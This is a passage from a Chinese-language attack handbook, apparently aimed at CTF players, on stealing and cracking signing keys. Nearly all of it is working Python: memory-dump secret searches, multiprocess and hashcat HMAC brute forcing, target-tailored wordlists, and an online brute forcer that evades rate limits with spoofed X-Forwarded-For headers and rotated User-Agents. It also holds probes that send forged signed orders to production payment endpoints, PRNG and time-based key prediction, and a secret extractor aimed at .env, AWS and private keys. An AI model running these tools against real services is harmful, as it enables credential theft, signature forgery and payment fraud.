    "keys_key": "KEYS *key*",
    "keys_token": "KEYS *token*",
    "keys_jwt": "KEYS *jwt*",
    "keys_auth": "KEYS *auth*",
    "keys_session": "KEYS *session*",
    "keys_all": "KEYS *",
    "get_app_key": "GET app_key",
    "get_jwt_secret": "GET jwt_secret",
}
```

#### 进程内存 dump

```python
# memory_dump_extract.py — 从进程内存 dump 中搜索密钥
import re, mmap, os

def search_keys_in_memory_dump(dump_path: str) -> list:
    """在内存 dump 文件中搜索密钥模式"""
    keys = []
    patterns = [
        (r'(?:secret|key|token|password)[:=]\s*["\']?([a-zA-Z0-9_\-+/=]{8,})["\']?', "env_pattern"),
        (r'[0-9a-fA-F]{64}', "hex64_key"),
        (r'[0-9a-fA-F]{128}', "hex128_key"),
        (r'[A-Za-z0-9+/]{40,}={0,2}', "base40plus"),
        (r'(?:JWT|jwt)\s*[:=]\s*["\']?([a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+)', "jwt_token"),
    ]

    with open(dump_path, "rb") as f:
        try:
            data = f.read()
        except MemoryError:
            # 大文件 mmap
            f.seek(0)
            data = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)

        # 搜索 ASCII 字符串
        if isinstance(data, bytes):
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                text = data.decode("latin-1", errors="ignore")
        else:
            text = data

        for pattern, label in patterns:
            for m in re.finditer(pattern, text):
                value = m.group(1) if m.lastindex else m.group(0)
                if 8 <= len(value) <= 200:
                    offset = text[:m.start()].count("\n")
                    keys.append({
                        "pattern": label,
                        "value": value[:80],
                        "length": len(value),
                        "offset": m.start(),
                        "line": offset,
                    })

    return keys
```

---

## 3. 密钥爆破

### 3.1 HMAC 密钥暴力破解 (多进程)

```python
# hmac_brute.py — 多进程 HMAC 密钥暴力破解
import hmac
import hashlib
import itertools
import string
import multiprocessing as mp
from typing import List, Optional
from functools import partial

def hmac_check(args) -> Optional[str]:
    """
    单次 HMAC 校验 (用于多进程 worker)

    Args:
        args: (key_bytes, data_bytes, target_sig, method)
    Returns:
        key 字符串 (如果匹配) 或 None
    """
    key_bytes, data, target_sig, method = args
    h = hmac.new(key_bytes, data, getattr(hashlib, method))
    if h.hexdigest() == target_sig:
        return key_bytes.decode("utf-8", errors="ignore")
    return None


def brute_force_hmac_wordlist(
    data: bytes,
    target_sig: str,
    wordlist: List[str],
    method: str = "sha256",
    workers: int = None
) -> Optional[str]:
    """
    用词列表进行 HMAC 多进程爆破

    hmac.new(key, data, hashlib.sha256).hexdigest() == target_sig?
    """
    if workers is None:
        workers = mp.cpu_count()

    print(f"[*] Brute forcing with {len(wordlist)} keys, {workers} workers...")
    pool = mp.Pool(workers)

    # 准备参数
    args_list = [
        (key.encode(), data, target_sig, method)
        for key in wordlist
    ]

    # 多进程 map
    results = pool.map(hmac_check, args_list, chunksize=len(args_list) // workers + 1)
    pool.close()
    pool.join()

    for r in results:
        if r is not None:
            return r
    return None


def brute_force_hmac_charset(
    data: bytes,
    target_sig: str,
    charset: str = string.ascii_lowercase + string.digits,
    max_length: int = 6,
    method: str = "sha256",
    workers: int = None
) -> Optional[str]:
    """
    用指定字符集进行 HMAC 暴力破解 (长度 1..max_length)

    注意: 长度 6 的 36 字符集 = 36^6 ≈ 2.2B, 建议先用字典
    """
    if workers is None:
        workers = mp.cpu_count()

    print(f"[*] Brute forcing charset={charset}, max_length={max_length}...")

    total = sum(len(charset) ** i for i in range(1, max_length + 1))
    print(f"[*] Total combinations: {total:,}")

    with mp.Pool(workers) as pool:
        for length in range(1, max_length + 1):
            print(f"[*] Trying length {length}...")
            # 生产 10000 个 batch 提交
            batch = []
            for combo in itertools.product(charset, repeat=length):
                key = "".join(combo)
                args = (key.encode(), data, target_sig, method)
                batch.append(args)

                if len(batch) >= 10000:
                    for r in pool.imap_unordered(hmac_check, batch, chunksize=100):
                        if r:
                            pool.terminate()
                            return r
                    batch = []

            if batch:
                for r in pool.imap_unordered(hmac_check, batch, chunksize=100):
                    if r:
                        pool.terminate()
                        return r

    return None


def chunked_hmac_brute(
    data: bytes,
    target_sig: str,
    wordlist_chunks: List[List[str]],
    method: str = "sha256"
) -> Optional[str]:
    """
    分块爆破: 将大词表分成多块，每块独立爆破

    适用于: 10M+ 词表需要逐步排查
    """
    for chunk_idx, chunk in enumerate(wordlist_chunks):
        print(f"[*] Chunk {chunk_idx + 1}/{len(wordlist_chunks)} ({len(chunk)} keys)")
        result = brute_force_hmac_wordlist(data, target_sig, chunk, method)
        if result:
            return result
    return None
```

### 3.2 目标上下文词表生成

```python
# context_wordlist_gen.py — 从目标上下文生成定制爆破词表
import itertools, re, hashlib, os
from typing import Set, List

def generate_context_wordlist(
    domain: str = "",
    company: str = "",
    app_name: str = "",
    team_members: List[str] = None,
    found_keywords: List[str] = None,
    extra: List[str] = None,
) -> Set[str]:
    """
    从目标上下文信息生成定制爆破词表

    典型 CTF 场景:
    - 公司名是 "AwesomeSoft"
    - 应用名是 "SuperPay"
    - 域名是 "superpay.awesome.com"
    - 于是密钥可能是: AwesomeSoft_secret, SuperPayKey, awesome_signing_key
    """
    words = set()

    # --- 基础词 ---
    base = ["secret", "key", "sign", "signing", "hmac", "token", "auth",
            "private", "password", "hash", "salt", "jwt", "session",
            "encrypt", "decode", "verify", "checksum"]

    # --- 收集所有上下文词 ---
    contexts = []
    for src in [domain, company, app_name]:
        if src:
            # 以各种方式拆分
            contexts.append(src.lower())
            contexts.append(src.upper())
            contexts.append(src.capitalize())
            # 驼峰拆分
            contexts.extend(re.findall(r'[A-Z][a-z]+|[a-z]+|[A-Z]+', src))
            # 域名分段
            parts = src.replace("https://", "").replace("http://", "").split(".")
            contexts.extend(parts)
            # 反转
            contexts.append(".".join(reversed(parts)))

    if team_members:
        for m in team_members:
            contexts.append(m.lower())
            contexts.append(m.upper())
            contexts.append(m.capitalize())

    if found_keywords:
        contexts.extend(found_keywords)

    # --- 基础组合 ---
    for ctx in contexts:
        ctx_lower = ctx.lower()
        if len(ctx_lower) < 2:
            continue
        for b in base:
            words.add(f"{ctx_lower}_{b}")
            words.add(f"{ctx_lower}-{b}")
            words.add(f"{ctx_lower}{b}")
            words.add(f"{b}_{ctx_lower}")
            words.add(f"{b}-{ctx_lower}")
            words.add(f"{b}{ctx_lower}")

        # 数字后缀
        for year in ["2023", "2024", "2025", "2026"]:
            words.add(f"{ctx_lower}_{year}")
            words.add(f"{ctx_lower}{year}")

        # 编码变体
        words.add(hashlib.md5(ctx_lower.encode()).hexdigest())
        words.add(hashlib.sha256(ctx_lower.encode()).hexdigest()[:32])

    # --- 额外词汇 ---
    if extra:
        words.update(extra)

    return words


def merge_wordlists(*lists: List[str]) -> List[str]:
    """合并多个词表并去重"""
    merged = set()
    for lst in lists:
        merged.update(lst)
    return list(merged)


def write_wordlist(words: Set[str], output_path: str):
    """将词表写入文件 (一行一个)"""
    with open(output_path, "w", encoding="utf-8") as f:
        for w in sorted(words):
            f.write(w + "\n")
    print(f"[+] Wordlist written to {output_path} ({len(words)} words)")


def apply_mutations(word: str) -> List[str]:
    """对单个词应用常见变异"""
    mutations = [word]
    mutations.append(word.upper())
    mutations.append(word.lower())
    mutations.append(word.capitalize())
    mutations.append(word + "1")
    mutations.append(word + "123")
    mutations.append(word.replace("e", "3"))
    mutations.append(word.replace("o", "0"))
    mutations.append(word.replace("s", "$"))
    mutations.append(word.replace("a", "@"))
    return list(dict.fromkeys(mutations))
```

### 3.3 GPU 加速 HMAC 破解

```python
# gpu_hmac_crack.py — GPU 加速 HMAC 破解框架 (hashcat + python)
import subprocess, os, tempfile, json

def hashcat_hmac_bruteforce(
    data_hex: str,
    target_sig: str,
    method: str = "sha256",
    wordlist: str = None,
    mask: str = "?l?l?l?l?l?l",        # 6 位小写字母
    rules: str = None                  # hashcat rule file
) -> dict:
    """
    使用 hashcat 进行 GPU 加速 HMAC 破解

    hashcat HMAC mode:
      - 1450: HMAC-SHA256 (key = $pass, data = $salt)
      - 1460: HMAC-SHA256 (key = $salt, data = $pass)
      - 1420: HMAC-SHA1 (key = $pass, data = $salt)
      - 1440: HMAC-SHA1 (key = $salt, data = $pass)
      - 1410: HMAC-MD5 (key = $pass, data = $salt)

    hashcat hash format:
      hmac_sha256($data).$data:$sig

    注意: hashcat 的 HMAC 模式中
    - $pass 是来自字典/穷举的输入 (即密钥)
    - $salt 是固定前缀 (即数据)
    """
    # 写哈希文件
    hf = tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False)
    if method == "sha256":
        mode = "1450"  # HMAC-SHA256(key=$pass, data=$salt)
    elif method == "sha1":
        mode = "1420"  # HMAC-SHA1
    elif method == "md5":
        mode = "1410"  # HMAC-MD5
    else:
        raise ValueError(f"Unsupported method: {method}")

    # hashcat 格式: hmac_sha256($data).$data:$sig
    hash_entry = f"{target_sig}:{data_hex}"
    hf.write(hash_entry)
    hf.close()

    cmd = [
        "hashcat",
        "-m", mode,
        "-a", "3" if not wordlist else "0",  # 3=brute, 0=dictionary
        "-o", hf.name + ".cracked",
        "--show" if "--show" else "",
        hf.name,
    ]

    if wordlist:
        cmd.append(wordlist)
    else:
        cmd.append(mask)

    if rules:
        cmd.extend(["-r", rules])

    # GPU 加速
    cmd.extend(["--force", "--optimized-kernel-enable"])

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

    # 读取结果
    cracked = None
    if os.path.exists(hf.name + ".cracked"):
        with open(hf.name + ".cracked") as f:
            cracked = f.read().strip()

    return {
        "mode": mode,
        "command": " ".join(cmd),
        "stdout": result.stdout[-500:],
        "stderr": result.stderr[-500:],
        "cracked": cracked,
        "hash_file": hf.name,
        "output_file": hf.name + ".cracked",
    }


# hashcat 掩码说明:
# ?l = abcdefghijklmnopqrstuvwxyz
# ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
# ?d = 0123456789
# ?s = !@#$%^&*()-_+= etc
# ?a = ?l?u?d?s
# ?b = 0x00-0xff

HMAC_HASHCAT_MASKS = {
    "6_lower": "?l?l?l?l?l?l",
    "8_lower": "?l?l?l?l?l?l?l?l",
    "6_alnum": "?l?l?l?l?l?l?d",
    "8_alnum": "?l?l?l?l?l?l?l?l?d?d",
    "10_alnum": "?l?l?l?l?l?l?l?l?l?l?d",
    "6_mixed": "?l?u?l?u?l?d",
    "8_mixed": "?l?u?l?l?d?d?l?u?d",
}
```

### 3.4 在线密钥爆破绕过

```python
# online_key_brute.py — 在线密钥爆破 (带绕过)
import requests, time, itertools, string, random
from typing import Optional, List

class OnlineKeyBruteForcer:
    """
    在线密钥爆破器

    场景: 使用密钥对某个值签名后传给 API
    例如: sign = hmac.new(key, order_id).hexdigest()
          GET /api/check?order_id=X&sign=Y
          如果 key 正确 → 200/OK，错误 → 403/401
    """

    def __init__(self, base_url: str, sign_param: str = "sign",
                 rate_limit: float = 0.5):
        self.base_url = base_url
        self.sign_param = sign_param
        self.rate_limit = rate_limit
        self.session = requests.Session()
        self.last_request = 0

    def _rate_limit_wait(self):
        """速率限制绕过"""
        elapsed = time.time() - self.last_request
        if elapsed < self.rate_limit:
            time.sleep(self.rate_limit - elapsed)

    def _request_with_bypass(self, url: str, **kwargs) -> requests.Response:
        """带绕过策略的请求"""
        self._rate_limit_wait()

        # 轮换 User-Agent
        ua = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
        ])
        headers = kwargs.pop("headers", {})
        headers["User-Agent"] = ua
        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

        r = self.session.get(url, headers=headers, timeout=10, **kwargs)
        self.last_request = time.time()
        return r

    def test_key(self, key: str, test_data: str, get_sig_func) -> bool:
        """
        测试单个密钥

        get_sig_func: (key, data) → signature string 的函数
        """
        sig = get_sig_func(key, test_data)
        url = f"{self.base_url}?{self.sign_param}={sig}"

        try:
            r = self._request_with_bypass(url)
            # 根据响应区分成功/失败
            if r.status_code == 200:
                return True
            elif r.status_code == 429:
                # Rate limited — 增加延迟
                self.rate_limit *= 1.5
                print(f"[!] Rate limited, new delay: {self.rate_limit:.1f}s")
                time.sleep(5)
                return False
            return False
        except requests.RequestException:
            return False

    def online_brute(
        self,
        keys: List[str],
        test_data: str,
        get_sig_func,
        success_callback=None
    ) -> Optional[str]:
        """
        在线爆破主循环

        args:
            keys: 待测试的密钥列表
            test_data: 用于签名的测试数据
            get_sig_func: (key, data) → sig
            success_callback: 可选，找到密钥后调用的函数
        """
        print(f"[*] Online brute starting: {len(keys)} keys to test")

        for idx, key in enumerate(keys):
            if idx % 10 == 0:
                print(f"[*] Progress: {idx}/{len(keys)} (rate: {1/self.rate_limit:.1f}/s)")

            if self.test_key(key, test_data, get_sig_func):
                print(f"[!] KEY FOUND: {repr(key)}")
                if success_callback:
                    success_callback(key)
                return key

            # 抖动: 偶尔随机延迟
            if random.random() < 0.1:
                time.sleep(random.uniform(0.5, 2.0))

        return None

    def parallel_key_rotation(self, keys: List[str], test_data: str, get_sig_func):
        """
        密钥轮换绕过: 如果每个 key 都有速率限制,
        用多个 IP/会话并行测试不同 key
        """
        # 简版: 单次测试一组 key
        for key in keys:
            if self.test_key(key, test_data, get_sig_func):
                return key
        return None
```

---

## 4. 密钥重用

### 4.1 环境间密钥重用

```python
# key_reuse_detector.py — 检测密钥在环境/服务间重用
import requests, json, hashlib, hmac
from typing import Dict, List

def detect_key_reuse_across_endpoints(
    endpoints: Dict[str, str],
    test_data: str,
    test_signature: str,
    sign_method: str = "sha256"
) -> Dict[str, List[str]]:
    """
    检测同一密钥是否被多个端点复用

    方法: 用已知签名作为"指纹", 看哪些端点用同一密钥
    - 如果两个端点的签名算法相同, 密钥相同 → 签名结果相同
    - 发送相同数据到不同端点, 比较签名是否一致

    Args:
        endpoints: {name: url}
        test_data: 用于签名的测试数据
        test_signature: 用某个密钥计算的签名
        sign_method: HMAC 方法
    """
    results = {"same_key": [], "different_key": []}
    target_sig = test_signature

    for name, url in endpoints.items():
        try:
            r = requests.post(url, json={
                "data": test_data,
                "sign": target_sig
            }, timeout=10)

            # 根据返回判断:
            # 200 = 签名验证通过 → 同密钥
            # 403/4xx = 可能不同密钥
            if r.status_code == 200:
                results["same_key"].append({
                    "endpoint": name,
                    "url": url,
                    "status": r.status_code,
                    "evidence": r.text[:200],
                })
            else:
                results["different_key"].append({
                    "endpoint": name,
                    "url": url,
                })
        except Exception as e:
            results.setdefault("errors", []).append({
                "endpoint": name,
                "error": str(e),
            })

    return results


def test_key_reuse_between_services(
    dev_base: str, staging_base: str, prod_base: str,
    test_path: str = "/api/verify",
    data: dict = None
) -> dict:
    """
    测试 dev/staging/prod 是否复用密钥

    场景: dev 环境密钥泄露 → 可用于伪造 prod 签名
    """
    if data is None:
        data = {"order_id": "test", "amount": "0.01"}

    findings = {}

    for env_name, base in [("dev", dev_base), ("staging", staging_base), ("prod", prod_base)]:
        if not base:
            continue
        url = base.rstrip("/") + test_path
        try:
            r = requests.post(url, json=data, timeout=10)
            findings[env_name] = {
                "url": url,
                "status_code": r.status_code,
                "response": r.text[:200],
                "headers": dict(r.headers),
            }
        except Exception as e:
            findings[env_name] = {"error": str(e)}

    return findings
```

### 4.2 服务间密钥重用

```python
def detect_cross_service_key_reuse(config: dict) -> list:
    """
    检测同一项目中的不同服务是否复用密钥

    典型 CTF 场景:
    - 支付服务用 HMAC-SHA256(secret, order_data)
    - JWT 用 HS256(secret) 签发
    - Session 用 HMAC-SHA256(secret, session_id)
    - 同一个 secret 出现在多个地方 → 任意位置泄露即全系统沦陷

    检测方法:
    1. 收集所有已知签名和数据
    2. 在 JWT 中尝试用收集到的密钥解码
    3. 在回调签名中尝试 JWT secret
    """
    findings = []

    jwt_secrets = config.get("jwt_secrets", [])
    callback_secrets = config.get("callback_secrets", [])
    session_secrets = config.get("session_secrets", [])
    api_keys = config.get("api_keys", [])

    # 排列组合: 用 JWT secret 测试回调签名
    for name, secret in jwt_secrets:
        for cb_name, cb_data, cb_sig in callback_secrets:
            h = hmac.new(secret.encode(), cb_data.encode(), hashlib.sha256)
            if h.hexdigest() == cb_sig:
                findings.append({
                    "type": "jwt_to_callback",
                    "jwt_name": name,
                    "callback_name": cb_name,
                    "key": secret,
                })

    # 排列组合: 用 session secret 测试 JWT
    for name, secret in session_secrets:
        for jwt_name, jwt_data in jwt_secrets:
            # JWT 可以尝试各种已知 secret 解码
            pass  # 具体 JWT 破解参考 jwt/ 目录

    # 排列组合: API key 直接作为 HMAC 密钥
    for name, api_key in api_keys:
        for cb_name, cb_data, cb_sig in callback_secrets:
            h = hmac.new(api_key.encode(), cb_data.encode(), hashlib.sha256)
            if h.hexdigest() == cb_sig:
                findings.append({
                    "type": "api_key_to_callback",
                    "api_key_name": name,
                    "callback_name": cb_name,
                    "key": api_key,
                })

    return findings
```

### 4.3 多租户密钥复用

```python
def detect_tenant_key_reuse(
    tenant_endpoints: Dict[str, str],
    test_order_id: str = "ORDER001"
) -> dict:
    """
    检测 SaaS 多租户是否复用同一密钥

    场景: 平台为每个客户提供支付/回调功能
    - 正常: 每个客户有独立密钥
    - 漏洞: 所有客户共享同一密钥
    - 漏洞: 密钥 = hash(tenant_id)，可预测

    Args:
        tenant_endpoints: {tenant_id: callback_url}
    """
    results = {"vulnerable": False, "evidence": []}

    # 策略1: 用同一签名请求不同租户的回调
    for tenant_id, url in tenant_endpoints.items():
        body = {
            "order_id": test_order_id,
            "amount": "0.01",
            "status": "success",
            "sign": "fixed_test_signature_123",
        }
        try:
            r = requests.post(url, json=body, timeout=10)
            results.setdefault("responses", {})[tenant_id] = {
                "status": r.status_code,
                "body": r.text[:200],
            }
        except Exception:
            pass

    # 策略2: 分析回调 URL 模式 → 找出密钥模式
    for tid, url in tenant_endpoints.items():
        # 密钥来自 path 或 param?
        m = re.search(r'/(\w+)/callback', url)
        if m:
            derived_key = m.group(1)
            results.setdefault("derived_keys", {})[tid] = derived_key

    # 策略3: 检查是否所有租户返回相同错误信息
    # 如果密钥不同 → 解密错误信息可能不同
    error_messages = set()
    for tenant_id, resp in results.get("responses", {}).items():
        error_messages.add(resp.get("body", ""))
    results["unique_error_messages"] = len(error_messages)
    if len(error_messages) <= 1 and len(tenant_endpoints) > 1:
        results["vulnerable"] = True
        results["evidence"].append("All tenants return identical error → shared key")

    return results
```

### 4.4 沙箱 == 生产密钥

```python
def detect_sandbox_production_key_reuse(
    sandbox_base: str,
    production_base: str,
    known_sandbox_key: str = ""
) -> dict:
    """
    检测沙箱密钥是否与生产环境相同

    常见支付漏洞:
    - 支付宝沙箱密钥 == 生产密钥
    - Stripe test key == live key (但不同前缀)
    - 微信支付沙箱密钥 == 正式密钥 (最致命)
    """
    findings = {}

    # 策略: 用已知沙箱密钥调用生产环境 API
    test_data = {"order_id": "test_sandbox_prod", "amount": 0.01}
    sig = hmac.new(
        known_sandbox_key.encode(),
        json.dumps(test_data, sort_keys=True).encode(),
        hashlib.sha256
    ).hexdigest()

    test_data["sign"] = sig

    # 如果生产环境接受沙箱密钥签名的请求 → 漏洞
    prod_url = production_base.rstrip("/") + "/api/order/create"
    try:
        r = requests.post(prod_url, json=test_data, timeout=10)
        findings["prod_accepts_sandbox_key"] = (r.status_code == 200)
        findings["prod_response"] = r.text[:200]
    except Exception as e:
        findings["prod_error"] = str(e)

    # 反向测试: 用生产可逆推的信息测试沙箱
    sandbox_url = sandbox_base.rstrip("/") + "/api/order/create"
    try:
        r = requests.post(sandbox_url, json=test_data, timeout=10)
        findings["sandbox_response"] = r.text[:200]
    except Exception:
        pass

    return findings
```

---

## 5. 密钥预测

### 5.1 PRNG 种子恢复

```python
# prng_seed_recovery.py — 伪随机数生成器种子恢复
import hashlib, struct, time, random
from typing import List, Optional

# === PHP mt_rand 种子恢复 ===
# 参考: php_mt_seed 工具 (https://github.com/openwall/php_mt_seed)

def php_mt_rand_state_recovery(known_values: List[int]) -> Optional[int]:
    """
    PHP mt_rand() 使用 Mersenne Twister (MT19937)
    如果密钥 = mt_rand(), 且你知道几个连续输出 → 可恢复种子

    注意: 完整实现需要 MT19937 逆向算法
    这里提供概念性接口，CTF 中可直接用 php_mt_seed 工具
    """
    # php_mt_seed 用法:
    # ./php_mt_seed <value1> <value2> ...
    # 输出可能的种子列表
    # 用种子生成密钥 → 测试

    print("[*] Use php_mt_seed CLI tool for seed recovery:")
    print(f"    ./php_mt_seed {' '.join(map(str, known_values[:4]))}")
    return None


# === Python random 种子恢复 ===
def python_random_state_recovery(outputs: List[int]) -> Optional[int]:
    """
    Python random.getrandbits(k) 或 random.randint(a,b)
    如果密钥 = str(random.getrandbits(128)) 之类

    randcrack 工具可以轻松恢复:
    pip install randcrack
    """
    try:
        from randcrack import RandCrack
        rc = RandCrack()

        # 需要 624 个连续的 32-bit 输出来恢复完整状态
        # 如果密钥用 random.getrandbits 生成 → 可以预测
        for val in outputs[:624]:
            rc.feed(val)

        # 预测下一个值
        predicted = rc.predict_randrange(0, 2**128)
        print(f"[!] Predicted next random value: {predicted}")
        return predicted
    except ImportError:
        print("[-] Install randcrack: pip install randcrack")
        return None


# === JavaScript Math.random 种子恢复 ===
# V8 使用 XorShift128+
# 需要 2 个连续的 64-bit double 输出来恢复状态

def v8_xorshift128_recovery(doubles: List[float]) -> Optional[int]:
    """
    V8 Math.random() 种子恢复 (XorShift128+)

    参考: https://github.com/d0nutptr/v8_rand_buster
    需要连续 2 个 Math.random() 输出即可恢复完整 RNG 状态
    """
    print("[*] Use v8_rand_buster for V8 Math.random() seed recovery")
    print(f"    Input doubles: {doubles[:4]}")
    print("    Ref: https://github.com/d0nutptr/v8_rand_buster")
    return None


# === 通用: 从密钥模式反推种子 ===
def guess_prng_based_key(key: str) -> dict:
    """
    分析密钥是否来自 PRNG 并尝试预测

    线索:
    - 如果密钥看起来像 hex(random) → 长度是否 = 8/16/32/64?
    - 如果密钥看起来像整数 → 是否在 0..2^31-1 范围? (PHP mt_rand)
    - 如果密钥是 alphanumeric(32) → random.getrandbits(128) 的 hex
    """
    analysis = {}

    # 检查 hex 长度
    if re.match(r'^[0-9a-f]+$', key):
        analysis["hex_length"] = len(key)
        analysis["possible_bits"] = len(key) * 4
        if len(key) == 8:
            analysis["guess"] = "Possible mt_rand() 32-bit hex"
        elif len(key) == 16:
            analysis["guess"] = "Possible 64-bit random"
        elif len(key) == 32:
            analysis["guess"] = "Possible 128-bit random (getrandbits)"
        elif len(key) == 64:
            analysis["guess"] = "Possible 256-bit random"

    # 检查数字模式
    if key.isdigit():
        val = int(key)
        if val < 2**31:
            analysis["guess"] = f"Possible mt_rand() value: {val}"

    return analysis


# PHP mt_rand crack 辅助
def php_mt_crack(seed_value: int, key_count: int = 10) -> List[str]:
    """
    给定 mt_rand 种子，生成后续 mt_rand() 输出

    注意: PHP 7.1+ 使用修复版的 Mersenne Twister
    PHP 5.x-7.0 使用旧版
    """
    # python 的 random 与 PHP mt_rand 同源 (MT19937)
    rng = random.Random(seed_value)
    outputs = []
    for _ in range(key_count):
        outputs.append(str(rng.getrandbits(32)))
        outputs.append(hex(rng.getrandbits(32)))
    return outputs
```

### 5.2 基于时间的密钥生成

```python
# time_based_key_predict.py — 时间基密钥预测
from datetime import datetime, timedelta
import hashlib, itertools
from typing import List, Optional

def predict_time_based_key(
    known_timestamp: datetime = None,
    pattern: str = "md5(secret_%Y-%m-%d)",
    window_days: int = 7,
    secret_suffixes: List[str] = None,
) -> List[str]:
    """
    预测时间基密钥

    常见 CTF 模式:
    - key = md5("secret_" + date("Y-m-d"))
    - key = md5(date("Ymd") + "_signing_key")
    - key = sha256(app_name + str(start_of_day_timestamp))
    - key = hmac.new(date_key, "fixed_data").hexdigest()

    Args:
        known_timestamp: 已知密钥对应的时间
        pattern: 时间格式。支持:
            - %Y-%m-%d: 每日变化
            - %Y%m%d: 紧凑日期
            - %H: 每小时变化
            - %Y-%m-%d-%H: 每小时
            - %s: Unix timestamp
        window_days: 前后窗口天数
        secret_suffixes: 可选的 secret 前缀列表
    """
    if known_timestamp is None:
        known_timestamp = datetime.utcnow()
    if secret_suffixes is None:
        secret_suffixes = ["secret", "key", "sign", ""]

    keys = []

    for day_offset in range(-window_days, window_days + 1):
        ts = known_timestamp + timedelta(days=day_offset)

        for suffix in secret_suffixes:
            # 日期格式
            date_str = ts.strftime("%Y-%m-%d")
            compact = ts.strftime("%Y%m%d")
            hour = ts.strftime("%Y-%m-%d-%H")
            unix_ts = str(int(ts.timestamp()))
            unix_ms = str(int(ts.timestamp() * 1000))
            day_of_year = str(ts.timetuple().tm_yday)

            combos = [
                f"{suffix}_{date_str}",
                f"{date_str}_{suffix}",
                f"{suffix}{compact}",
                f"{compact}{suffix}",
                f"{suffix}_{hour}",
                f"{suffix}_{unix_ts}",
                f"{suffix}_{unix_ms}",
                f"salt_{date_str}_{suffix}",
            ]

            for c in combos:
                key = c.strip("_")
                if key:
                    keys.append(hashlib.md5(key.encode()).hexdigest())
                    keys.append(hashlib.sha256(key.encode()).hexdigest()[:32])
                    keys.append(key)

    # 去重
    return list(dict.fromkeys(keys))


def find_time_based_key_schedule(key_history: List[str]) -> Optional[dict]:
    """
    如果有多个不同时间的密钥, 推断密钥调度策略

    例如: 每天更换密钥
    key_day1 = md5("secret_2026-01-01")
    key_day2 = md5("secret_2026-01-02")
    ...
    """
    if len(key_history) < 2:
        return None

    # 检查是否是简单的日期基模式
    for pattern in ["%Y-%m-%d", "%Y%m%d"]:
        consistent = True
        for i, k in enumerate(key_history):
            # 试生成对应日期的密钥
            pass
        if consistent:
            return {"pattern": pattern, "consistent": True}

    return None
```

### 5.3 顺序密钥模式

```python
# sequential_key_patterns.py — 顺序密钥模式检测
import re, string, itertools
from typing import List, Optional

def detect_sequential_pattern(keys: List[str]) -> Optional[dict]:
    """
    检测顺序密钥模式

    常见:
    - KEY_001, KEY_002, KEY_003, ...
    - key_01, key_02, ... key_99, key_100
    - secret_1, secret_2, ... secret_n
    - 00000001, 00000002, ...
    """
    if len(keys) < 2:
        return None

    # 提取数字部分
    def extract_number(key: str) -> Optional[int]:
        m = re.search(r'(\d+)$', key)
        if m:
            return int(m.group(1))
        m = re.search(r'_(\d+)$', key)
        if m:
            return int(m.group(1))
        return None

    numbers = []
    for k in keys:
        n = extract_number(k)
        if n is not None:
            numbers.append(n)

    if len(numbers) >= 2:
        # 检查是否是等差数列
        diffs = [numbers[i+1] - numbers[i] for i in range(len(numbers) - 1)]
        if len(set(diffs)) == 1:
            return {
                "pattern_type": "sequential_number_suffix",
                "diff": diffs[0],
                "numbers": numbers[:10],
                "next_predicted": numbers[-1] + diffs[0],
            }

    # 检查 base64 顺序
    # 有些系统用 base64(递增ID) 做密钥
    import base64
    b64_numbers = []
    for k in keys:
        try:
            decoded = base64.b64decode(k)
            n = int.from_bytes(decoded, 'big')
            b64_numbers.append(n)
        except Exception:
            pass

    if len(b64_numbers) >= 2:
        diffs = [b64_numbers[i+1] - b64_numbers[i] for i in range(len(b64_numbers) - 1)]
        if len(set(diffs)) == 1:
            return {
                "pattern_type": "base64_sequential",
                "diff": diffs[0],
                "decoded_numbers": b64_numbers[:10],
            }

    return None


def predict_next_sequential_key(last_known_key: str, pattern_type: str = "default") -> List[str]:
    """
    预测下一个顺序密钥

    根据已知模式生成后续可能的密钥值
    """
    predictions = []

    # 提取前缀和编号
    m = re.match(r'^(.*?)(\d+)$', last_known_key)
    if m:
        prefix = m.group(1)
        num_str = m.group(2)
        num = int(num_str)
        length = len(num_str)

        for delta in [1, 2, 10, 100, 1000]:
            next_num = num + delta
            next_str = str(next_num).zfill(length)
            predictions.append(f"{prefix}{next_str}")

    return predictions
```

---

## 6. 密钥提取自动化

### 6.1 `key_extractor.py` — 全自动密钥提取器

```python
#!/usr/bin/env python3
"""
key_extractor.py — 全自动密钥提取器

从以下来源自动提取密钥:
1. JavaScript bundle 扫描
2. Source map 恢复
3. .env 泄露扫描
4. Git 历史扫描
5. APK 字符串
6. HTML 注释/隐藏字段
7. Error page debug 信息

Usage:
    python key_extractor.py https://target.com
    python key_extractor.py https://target.com --deep  (含 source map + git)
    python key_extractor.py /path/to/js/bundle.js   (本地文件)
"""

import re, json, os, sys, base64, hashlib, requests, subprocess
from urllib.parse import urljoin, urlparse
from typing import List, Dict, Set
from concurrent.futures import ThreadPoolExecutor

# ============ 密钥模式 ============

SECRET_PATTERNS = {
    "generic_key": re.compile(
        r'["\'`](?:(?:secret|key|token|sign|hmac|jwt|session|auth|private|api)[_\-\.\s]*)'
        r'(?:key|secret|token)?["\'`]\s*[:=]\s*["\'`]([^"\'`]{8,})["\'`]', re.I
    ),
    "hex64": re.compile(r'["\'`]([0-9a-fA-F]{64})["\'`]'),
    "hex32": re.compile(r'["\'`]([0-9a-fA-F]{32})["\'`]'),
    "hex128": re.compile(r'["\'`]([0-9a-fA-F]{128})["\'`]'),
    "b64_long": re.compile(r'["\'`]([A-Za-z0-9+/]{40,}={0,2})["\'`]'),
    "jwt": re.compile(
        r'["\'`](eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+)["\'`]'
    ),
    "laravel_key": re.compile(
        r'APP_KEY\s*=\s*["\']?base64:([^"\'<\s]+)["\']?'
    ),
    "aws_key": re.compile(
        r'(?:AKIA[0-9A-Z]{16}|aws[_-]?(?:secret|access)[_-]?key)[:=]\s*["\']?(\S+)', re.I
    ),
    "private_key_block": re.compile(
        r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'
    ),
}
